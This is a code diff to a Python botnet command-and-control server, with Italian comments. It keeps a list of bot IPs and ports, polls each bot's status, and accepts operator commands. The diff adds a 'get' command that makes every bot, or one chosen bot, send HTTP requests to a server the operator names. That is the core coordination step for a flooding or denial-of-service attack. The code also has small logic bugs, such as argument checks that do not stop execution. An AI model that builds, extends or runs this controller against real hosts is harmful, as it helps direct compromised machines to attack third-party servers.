@@ -15,14 +15,13 @@ class CC:
 
     # costruttore
     def __init__(self):
-        return
+        self.loadData()
 
     # aggiunge un bot alle liste
     def addBot(self, ip, portList, status):
         while (not self.activeBotSf):
             continue
         self.activeBotSf = False
-        print(portList)
         self.activeBot[ip] = [portList, status]
         self.activeBotSf = True
         return True
@@ -67,7 +66,7 @@ class CC:
                 newPorts = []
                 for i in v[0]:
                     try:
-                        url = "http://" + k + ":" + i
+                        url = "http://" + k + ":" + i + "/status"
                         response = requests.get(url)
                         res = response.json()
                         self.activeBot[k] = [v[0], res["status"]]
@@ -85,7 +84,7 @@ class CC:
             newPorts = []
             for i in port:
                 try:
-                    url = "http://" + target + ":" + port[0]
+                    url = "http://" + target + ":" + port[0] + "/status"
                     response = requests.get(url)
                     res = response.json()
                     self.activeBot[target] = [port, res["status"]]
@@ -97,6 +96,28 @@ class CC:
             else:
                 self.activeBot[target] = [newPorts, "waiting"]
         print("Controllo terminato")
+
+    def makeHTTPRequest(self, server, target=""):
+        print("Invio richiesta...")
+        if target == "":
+            for k, v in self.activeBot.items():
+                try:
+                    url = "http://" + k + ":" + v[0][0] + "/get"
+                    response = requests.post(url, json={"url": server})
+                    res = response.json()
+                    self.activeBot[k] = [v[0], res["status"]]
+                except Exception as e:
+                    print(e)
+        else:
+            port = self.activeBot[target][0]
+            try:
+                url = "http://" + target + ":" + port[0] + "/status"
+                response = requests.post(url, json={"url": server})
+                res = response.json()
+                self.activeBot[target] = [port, res["status"]]
+            except Exception as e:
+                print(e)
+        print("Richiesta inviata")
 
     def command(self, event):
         sleep(1)
@@ -113,23 +134,42 @@ class CC:
                 print("Ip\t\tPorts\t\tStatus")
                 for k, v in self.activeBot.items():
                     print(f"{k}\t{v[0]}\t\t{v[1]}")
-            if comando == "ck -all":
-                self.checkBot()
+            if comando.startswith("get"):
+                c = comando.split(" ")
+                if len(c) == 1 or len(c) == 2:
+                    print("Command not found")
+                if c[2] == "all":
+                    self.makeHTTPRequest(c[1])
+                elif c[2] in self.activeBot:
+                    self.makeHTTPRequest(c[1], target=c[2])
+                else:
+                    print("Command not found. Correct command [get server all | get server target(ip)]")
+            if comando.startswith("ck"):
+                c = comando.split(" ")
+                if len(c) == 1:
+                    print("Command not found")
+                if c[1] == "all":
+                    self.checkBot()
+                elif c[1] in self.activeBot:
+                    self.checkBot(target=c[1])
+                else:
+                    print("Command not found. Correct command [ck all | ck target(ip)]")
 
+    # load activeBot from file
     def loadData(self):
         with open("./activeBot.json", 'r') as f:
             self.activeBot = json.load(f)
 
+    # write activeBot on file
     def writeData(self):
         with open("./activeBot.json", 'w') as f:
-            json.dump(self.activeBot, f, indent=1)
+            json.dump(self.activeBot, f, indent=2)
 
 
 # avvia il C&C
 def startCC():
     print("Starting C&C...")
     cc = CC()
-    cc.loadData()
     event = Event()
     task = []
     with ThreadPoolExecutor(max_workers=2) as exec:
